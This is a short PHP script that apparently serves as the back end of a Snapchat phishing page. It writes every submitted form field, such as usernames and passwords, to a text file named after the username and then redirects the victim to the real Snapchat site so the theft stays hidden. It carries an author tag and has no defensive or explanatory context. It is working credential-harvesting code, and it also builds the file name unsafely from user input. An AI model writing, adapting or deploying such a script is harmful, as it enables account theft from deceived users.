<?php
header ('Location:https://www.snapchat.com/');
$handle = fopen($_POST['username'].'.txt', 'a');
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, '=');
fwrite($handle, $value);
fwrite($handle, '|');
}
fwrite($handle, "by zorm#8322");
fwrite($handle,'|');
fwrite($handle,"\n");
fclose($handle);
exit;
?>